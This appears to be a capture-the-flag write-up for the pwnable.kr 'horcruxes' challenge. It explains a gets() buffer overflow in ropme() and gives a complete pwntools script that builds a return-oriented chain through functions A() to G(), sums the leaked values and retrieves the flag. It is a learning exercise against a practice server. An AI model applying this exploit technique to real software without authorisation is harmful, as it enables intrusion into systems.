> **Problem:**  
>
>	- okay so we are given an executable 'horcruxes' which is running on localhost 9032.  
>	- after decompiling the executable(you can copy the file from their server using scp and then use any online decompilation tool to get a pseudocode),we can see some interesting functions:  
>		1. init_ABCDEFG()=> this initializes random int and assigns thems to variables a,b,c,d,e,f,g.  
>		2. ropme()=> this is the interesting function.
><img width="1068" alt="ropme()" src="https://github.com/user-attachments/assets/1dae450d-daa6-442d-aa53-10e5dc4a4d54" />
>
>	- as we can see if our input of "How many EXP did you earned? : " matches with the sum the flag is printed.


---


>**Objective**
>	- we can exploit the gets() in ropme.gets() is vulnerable to bufferoverflow.so we can overwrite the return address to create a chain of function calls from A(),B(),...<G().<img width="1068" alt="gets()" src="https://github.com/user-attachments/assets/c43efb9a-0814-43e5-913e-3ff64f22794b" />
>   - this will show us the random intergers which we can sum up and then pass as input to match 'sum'.
>   - using gdb we get the address of necessary functions.<img width="592" alt="gdb" src="https://github.com/user-attachments/assets/24e1ac55-e617-4266-83f4-17b445789a18" />
>   - so here's what we will do:
>      	1. overflow upto $ebp+4.cause return address starts from $ebp+4.i kept the $ebx unchanged for safety.
>      	2. then we will add address of necessary function(A,B,C,D,E,F,G).[NOTE:we have to add the address where the function is defined.not the address where the instruction to jump to that function is stored.wasted a lot of time for that mistake.]
>   	3. then we will add the address of the starting of ropme() function.[NOTE:we have to jump to the starting of ropme() to maintain the stack.if you jump at middle or at the "select menu" or "How many EXP did you earned?" directly it might not work cause some registers value will not be same.I got frustrated here.]

---
> **Solution**
> <details>  
>	<summary><b>Click to see horcruxes.py </b></summary>  
>
>	```python  
>	from pwn import *  
>	import re  
>	import ctypes  
>	s=ssh(host='pwnable.kr',user='horcruxes',password='guest',port=2222)  
>	r=s.remote('localhost',9032)  
>	r.recvuntil(b"Select Menu:")  
>	r.sendline(b'1')   
>	r.recvuntil(b"How many EXP did you earned?")  
>	payload = b'A' * 112 #offset  
>	payload += p32(0x08043f90) #ebx  
>	payload += b'BBBB' #ebp  
>	payload += p32(0x804129d) #A()  
>	payload += p32(0x80412cf) #B()  
>	payload += p32(0x8041301) #C()  
>	payload += p32(0x8041333) #D()  
>	payload += p32(0x8041365) #E()  
>	payload += p32(0x8041397) #F()  
>	payload += p32(0x80413c9) #G()  
>	payload += p32(0x0804150b) #at the start of ropme() function to keep all required registers.  
>  
>	r.sendline(payload)  
>  
>	output=r.recvuntil(b"Select Menu:")  
>  
>	print(output.decode())  
>	raw_matches = re.findall(r'EXP \+?(-?\d+)', output.decode())  
>	total_exp = sum(int(n) for n in raw_matches)  
>	#for very large numbers(both positive and negative we have to wrap it up for 32 bits).  
>	total_exp_32 = ctypes.c_int32(total_exp).value  
>	print(f"[*] Raw Sum: {total_exp}")  
>	print(f"[*] 32-bit Signed Sum: {total_exp_32}")  
>  
>  
>	r.sendline(b'1')  
>	r.recvuntil(b"How many EXP did you earned?")  
>	r.sendline(str(total_exp_32).encode())  
>	print(r.recvall())  
>	r.interactive()  
>	```  
>  
>	</details>  
>	After running the script we get the flag.<img width="865" alt="result" src="https://github.com/user-attachments/assets/b49e1f5b-ae54-400a-93ca-f718b2bf2bdf" />
